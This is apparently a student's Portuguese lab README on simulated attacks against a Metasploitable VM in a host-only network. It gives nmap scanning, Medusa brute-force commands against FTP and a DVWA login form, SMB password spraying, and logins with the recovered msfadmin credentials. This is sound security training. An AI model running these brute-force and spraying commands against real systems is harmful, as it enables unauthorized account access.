ATENÇÂO:
- Todas as wordlists utilizadas estão disponíveis nesse arquivo;
- Esse readme é apenas uma instrução do que foi feito sobre cada ataque simulado;
- Imagens adicionais estão disponíveis no diretório 'images'.

Configuração do Ambiente:
- Ambos o Kali Linux e o Metasploitable Linux (Ubuntu) estão rodando em rede interna (Host-Only) no VMware Workstation.
- IP do Metasploitable: 192.168.209.129

Executar Ataques Simulados:
- Força Bruta em FTP:
  No terminal:
    - nmap -sV -p 21,22,80,445,139 192.168.209.129
      - Este comando foi utilizado para saber se o serviço ftp estava aberto. Ele está aberto na versão 'vsftpd 2.3.4';
    - ftp 192.168.209.129
      - Este comando foi utilizado para fazer uma conexão ftp com o Metasploitable. Porém, sem o usuário ou senha, não é possível fazer nada;
    - echo -e "user\nmsfadmin\nadmin\nroot" > users.txt
    - echo -e "123456\npassword\nquerty\nmsfadmin" > pass.txt
      - Ambos comandos foram utilizados como wordlists para descobrir o usuário e senha do ftp;
    - medusa -h 192.168.209.129 -U users.txt -P pass.txt -M ftp -t 6
      - Esse comando retornou 'ACCOUNT CHECK' e 'ACCOUNT FOUND', sendo 'msfadmin' o usuário e senha ftp;
    - ftp 192.168.209.129
    - msfadmin
    - msfadmin
      - Após isso, temos acesso ao serviço ftp.

- Automação de Tentativas em Formulário Web (DVWA):
  No Navegador Firefox:
    - http://192.168.209.129/dvwa/login.php
      - Entrando nesse endereço, aparece uma página de login. Porém, sem o login, não é possível fazer nada.
  No Terminal:
    - medusa -h 192.168.209.129 -U users.txt -P pass.txt http \
    - -m PAGE:'/dvwa/login.php' \
    - -m FORM:'username=^USER^&password=^PASS^&Login=Login' \
    - -m 'FAIL=Login failed' -t 6
      - Usando esses comandos, ele tem o mesmo comportamento do medusa do ataque ftp. Ele devolve as contas que foram checadas e quais que tiveram sucesso ao fazer login. No meu caso e no caso das video-aulas, eu não consegui fazer login com nenhum usuário e senha que o medusa retornou no navegador.

Password Spraying em SMB:
  No Terminal:
    - echo -e "user\nmsfadmin\nservice" > smb_users.txt
    - echo -e "password\n123456\nWelcome123\nmsfadmin" > senhas_spray.txt
      - Ambos comandos foram utilizados como wordlists para descobrir o usuário e senha do smb;
    - medusa -h 192.168.209.129 -U smb_users.txt -P senhas_spray.txt -M smbnt -t 2 -T 50
      - Usando esse comando, ele tem o mesmo comportamento do medusa do ataque ftp e da automação de tentativas. Ele retorna 'ACCOUNT CHECK' e 'ACCOUNT FOUND', sendo 'msfadmin' o usuário e senha ftp;
    - smbclient -L 192.168.209.129 -U msfadmin
    - msfadmin
      - Rodando o comando smbclient e botando 'msfadmin' como usuário e senha, ele nos retorna os diretórios que o usuário tem acesso, como o 'tmp' e o 'ADMIN$'.
